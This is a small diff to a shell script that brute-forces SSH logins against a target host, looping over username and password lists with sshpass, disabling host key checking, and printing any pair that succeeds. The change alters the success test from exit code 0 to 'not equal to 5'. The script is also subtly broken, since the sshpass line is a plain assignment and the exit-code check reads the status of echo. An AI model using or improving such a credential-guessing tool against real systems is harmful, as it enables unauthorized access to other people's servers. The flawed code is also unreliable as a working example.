@@ -15,7 +15,7 @@ do
     do
         test=sshpass -p "$line2" ssh -o StrictHostKeyChecking=no "$line"@"$1"
         echo $test
-        if [ $? -eq 0 ]; then
+        if [ $? -ne 5 ]; then
             echo "found user: $line and password: $line2"
             break
         fi
